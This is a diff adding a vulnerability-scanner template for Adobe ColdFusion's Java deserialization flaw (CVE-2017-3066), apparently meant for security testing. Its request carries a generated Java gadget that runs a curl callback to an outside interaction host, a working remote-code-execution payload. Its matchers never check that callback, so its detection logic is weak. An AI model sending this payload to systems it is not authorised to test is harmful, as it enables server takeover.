@@ -1,0 +1,36 @@
+id: adobe-coldfusion-java-deserialization-rce
+info:
+  name: Adobe ColdFusion Java Deserialization RCE (CVE-2017-3066)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Adobe ColdFusion is a dynamic web server product of Adobe. There is a Java deserialization vulnerability in Adobe ColdFusion, allowing attackers to execute arbitrary code in the context of the affected application, resulting in server permissions takeover.
+  classification:
+    cve-id: CVE-2017-3066
+    cvss-score: 9.8
+  reference:
+    - https://helpx.adobe.com/security/products/coldfusion/apsb17-14.html
+  tags: code-execution
+
+http:
+  - raw:
+      - |
+        POST /flex2gateway/amf HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-amf
+
+        {{generate_java_gadget("jdk8u20", "curl {{interactsh-url}}", "base64")}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "java.io.Serializable"
+        part: body
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "java\\.io\\.Serializable"
